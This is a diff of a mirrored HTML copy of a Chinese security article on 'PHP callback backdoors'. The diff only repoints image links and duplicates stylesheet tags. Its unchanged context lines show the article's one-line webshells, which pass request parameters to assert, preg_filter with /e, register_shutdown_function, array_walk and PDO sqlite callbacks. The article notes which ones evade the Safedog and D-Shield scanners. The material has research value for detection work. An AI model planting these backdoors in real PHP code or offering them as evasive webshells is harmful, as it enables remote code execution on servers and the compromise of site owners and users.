@@ -3,7 +3,7 @@
 			<head>
 			     <title>创造tips的秘籍——PHP回调后门 - phith0n</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/7279">http://drops.wooyun.org/tips/7279</a></h1>
 				
@@ -22,7 +22,7 @@
 
 <!--more-->
 
-<p><img src="http://static.wooyun.org//drops/20150720/20150720025221652074b22134d2ed573ea8fe2c3321be4e083" alt="enter image description here"></p>
+<p><img src="../images_result/images/20150720025221652074b22134d2ed573ea8fe2c3321be4e083" alt="enter image description here"></p>
 
 <p>最近又看到有人在发这个：http://www.secoff.net/archives/436.html</p>
 
@@ -46,7 +46,7 @@ call_user_func('assert', $_REQUEST['pass']);
 
 <p>这个后门，狗和盾都可以查到（但是狗不会拦截）：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/20150720025224214063f817fe243d9cc9156c9ccd3060dbdfb" alt="enter image description here"></p>
+<p><img src="../images_result/images/20150720025224214063f817fe243d9cc9156c9ccd3060dbdfb" alt="enter image description here"></p>
 
 <p>可php的函数库是很丰富的，只要简单改下函数安全狗就不杀了：</p>
 
@@ -56,7 +56,7 @@ call_user_func_array('assert', array($_REQUEST['pass']));
 
 <p><code>call_user_func_array</code>函数，和<code>call_user_func</code>类似，只是第二个参数可以传入参数列表组成的数组。如图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002522888092e0ed258576f4b0096557cf5b1797dfd6" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002522888092e0ed258576f4b0096557cf5b1797dfd6" alt="enter image description here"></p>
 
 <p>可见，虽然狗不杀了，D盾还是聪明地识别了出来。</p>
 
@@ -76,11 +76,11 @@ array_filter($arr, base64_decode($e));
 
 <p><code>array_filter</code>函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用（此后的测试环境都是开着狗的，可见都可以执行）：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002523099450c4d28d32cff6774bc033f189ac8c0128" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002523099450c4d28d32cff6774bc033f189ac8c0128" alt="enter image description here"></p>
 
 <p>这个后门，狗查不出来，但D盾还是有感应，报了个等级3（显然比之前的等级4要低了）：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002523376602b5f8dcdde7fe4a8d7e43334c4f92f882" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002523376602b5f8dcdde7fe4a8d7e43334c4f92f882" alt="enter image description here"></p>
 
 <p>类似array&#95;filter，array&#95;map也有同样功效：</p>
 
@@ -100,7 +100,7 @@ array_map(base64_decode($e), $arr);
 
 <p>php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参数descrition：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002523589790c4a6b8cdaa60b819734758eb8fea4941" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002523589790c4a6b8cdaa60b819734758eb8fea4941" alt="enter image description here"></p>
 
 <p>这就增加（改变）了一个很好的“执行代码”的方法assert，这个函数可以有一个参数，也可以有两个参数。那么以前回调后门中有两个参数的回调函数，现在就可以使用了。</p>
 
@@ -114,15 +114,15 @@ uasort($arr, base64_decode($e));
 
 <p>这个后门在php5.3时会报错，提示assert只能有一个参数：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002523732966b9f94dfeb6c7e311c0cff6ecb8924197" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002523732966b9f94dfeb6c7e311c0cff6ecb8924197" alt="enter image description here"></p>
 
 <p>php版本改作5.4后就可以执行了：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/20150720025239112498bc4572333cf0e76f88530a0e4779031" alt="enter image description here"></p>
+<p><img src="../images_result/images/20150720025239112498bc4572333cf0e76f88530a0e4779031" alt="enter image description here"></p>
 
 <p>这个后门，狗和盾是都查不出来的：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002524159405974203c39052ed0305f1ffb880f69a51" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002524159405974203c39052ed0305f1ffb880f69a51" alt="enter image description here"></p>
 
 <p>同样的道理，这个也是功能类似：</p>
 
@@ -168,7 +168,7 @@ array_udiff($arr, $arr2, $e);
 
 <p>array_walk的第二个参数是callable类型，正常情况下它是格式是两个参数的，但在0x03中说了，两个参数的回调后门需要使用php5.4.8后的assert，在5.3就不好用了。但这个回调其实也可以接受三个参数，那就好办了：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/201507200252444499387489f47a66308e99ee29d5714005627" alt="enter image description here"></p>
+<p><img src="../images_result/images/201507200252444499387489f47a66308e99ee29d5714005627" alt="enter image description here"></p>
 
 <p>php中，可以执行代码的函数：</p>
 
@@ -187,11 +187,11 @@ array_walk($arr, $e, '');
 
 <p>如图，这个后门可以在5.3下使用：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/201507200252461277361d65b8ffa55929f0c9ab25999bae1df" alt="enter image description here"></p>
+<p><img src="../images_result/images/201507200252461277361d65b8ffa55929f0c9ab25999bae1df" alt="enter image description here"></p>
 
 <p>但强大的D盾还是有警觉（虽然只是等级2）：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/201507200252488480781359093462654e1e3b67e42ee4792d6" alt="enter image description here"></p>
+<p><img src="../images_result/images/201507200252488480781359093462654e1e3b67e42ee4792d6" alt="enter image description here"></p>
 
 <p>不过呵呵，PHP拥有那么多灵活的函数，稍微改个函数（array&#95;walk&#95;recursive）D盾就查不出来了：</p>
 
@@ -217,9 +217,9 @@ echo preg_filter('|.*|e', $_REQUEST['pass'], '');
 
 <p>这两个一句话都是不杀的：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002525083861d8ebcf90b0e0f9f57cfa43a9b516688f" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002525083861d8ebcf90b0e0f9f57cfa43a9b516688f" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002525288447c090863dce4fa3b67c19b363b57a14db" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002525288447c090863dce4fa3b67c19b363b57a14db" alt="enter image description here"></p>
 
 <p>好用的一句话，且用且珍惜呀。</p>
 
@@ -239,9 +239,9 @@ ob_end_flush();
 
 <p>但如果执行一个url请求，用神器cloudeye还是能够观测到结果的：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/20150720025254797061e37640ca7c09c4d20abe77cb71aca2d" alt="enter image description here"></p>
+<p><img src="../images_result/images/20150720025254797061e37640ca7c09c4d20abe77cb71aca2d" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/20150720025255270419e0afbfb1d04f2366a5fb1592864283c" alt="enter image description here"></p>
+<p><img src="../images_result/images/20150720025255270419e0afbfb1d04f2366a5fb1592864283c" alt="enter image description here"></p>
 
 <p>即使没输出，实际代码是执行了的。也算作回调后门的一种。</p>
 
@@ -258,9 +258,9 @@ register_shutdown_function($e, $_REQUEST['pass']);
 
 <p>这个是php全版本支持的，且不报不杀稳定执行：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/2015072002525716670f1874cdd3f096cca5c5687fab33deb1e" alt="enter image description here"></p>
+<p><img src="../images_result/images/2015072002525716670f1874cdd3f096cca5c5687fab33deb1e" alt="enter image description here"></p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/201507200253002243645d7dbee40d8f086511a44c221ebd8ff" alt="enter image description here"></p>
+<p><img src="../images_result/images/201507200253002243645d7dbee40d8f086511a44c221ebd8ff" alt="enter image description here"></p>
 
 <p>再来一个：</p>
 
@@ -298,7 +298,7 @@ $sth-&gt;execute(array(':exec' =&gt; $_REQUEST['pass']));
 
 <p>执行之：</p>
 
-<p><img src="http://static.wooyun.org//drops/20150720/201507200253021254835a09ee7aa144ca3d97efcf531ad2f0c" alt="enter image description here"></p>
+<p><img src="../images_result/images/201507200253021254835a09ee7aa144ca3d97efcf531ad2f0c" alt="enter image description here"></p>
 
 <p>上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：</p>
 
